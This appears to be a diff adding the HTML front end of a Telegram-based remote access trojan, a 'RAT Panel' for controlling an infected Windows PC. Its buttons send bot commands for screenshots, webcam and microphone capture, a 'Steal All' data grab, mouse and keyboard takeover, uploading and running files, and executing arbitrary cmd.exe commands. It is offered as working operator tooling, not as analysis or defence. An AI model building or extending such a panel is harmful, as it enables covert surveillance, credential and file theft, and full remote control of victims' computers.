@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #1e1e2e; color: #fff; }
+        .btn { background: #2a2a3e; border: none; color: #fff; padding: 12px; border-radius: 8px; margin: 6px; width: 100%; cursor: pointer; }
+        .btn:hover { background: #3a3a5e; }
+        input, select { width: 100%; padding: 10px; margin: 6px 0; border-radius: 6px; border: none; background: #2a2a3e; color: #fff; }
+        .result { background: #0a0a1a; padding: 10px; border-radius: 6px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+    <h2>🔹 RAT Panel</h2>
+    <button class="btn" onclick="sendCmd('/screenshot')">📸 Screenshot</button>
+    <button class="btn" onclick="sendCmd('/webcam')">📷 Webcam (demo)</button>
+    <button class="btn" onclick="sendCmd('/mic')">🎤 Mic (10s)</button>
+    <button class="btn" onclick="sendCmd('/steal')">💾 Steal All</button>
+    <hr>
+    <h3>Mouse</h3>
+    <input type="number" id="mx" placeholder="X" value="100">
+    <input type="number" id="my" placeholder="Y" value="100">
+    <button class="btn" onclick="sendCmd('/mouse ' + document.getElementById('mx').value + ' ' + document.getElementById('my').value)">Move</button>
+    <button class="btn" onclick="sendCmd('/mouse 0 0 0')">Left Click</button>
+    <button class="btn" onclick="sendCmd('/mouse 0 0 1')">Right Click</button>
+    <hr>
+    <h3>Keyboard</h3>
+    <input type="text" id="kbtext" placeholder="Text to type">
+    <button class="btn" onclick="sendCmd('/keyboard ' + document.getElementById('kbtext').value)">Type</button>
+    <hr>
+    <h3>Run File</h3>
+    <input type="text" id="runpath" placeholder="Full path to exe">
+    <button class="btn" onclick="sendCmd('/run ' + document.getElementById('runpath').value)">Run</button>
+    <button class="btn" onclick="sendCmd('/upload')">📤 Upload file to PC</button>
+    <button class="btn" onclick="sendCmd('/run_uploaded')">▶️ Run uploaded file</button>
+    <hr>
+    <h3>Command</h3>
+    <input type="text" id="cmd" placeholder="cmd.exe command">
+    <button class="btn" onclick="sendCmd('/exec ' + document.getElementById('cmd').value)">Execute</button>
+    <hr>
+    <button class="btn" onclick="sendCmd('/exit')" style="background:#a00;">⛔ Exit RAT</button>
+    <hr>
+    <div id="result" class="result">Ready...</div>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function sendCmd(cmd) {
+            if (!cmd) return;
+            document.getElementById('result').innerText = '⏳ Sending: ' + cmd;
+            // Отправляем команду через web_app_data
+            tg.sendData(cmd);
+            // Ответы будут приходить в чат
+            document.getElementById('result').innerText = '✅ Command sent: ' + cmd;
+        }
+    </script>
+</body>
+</html>
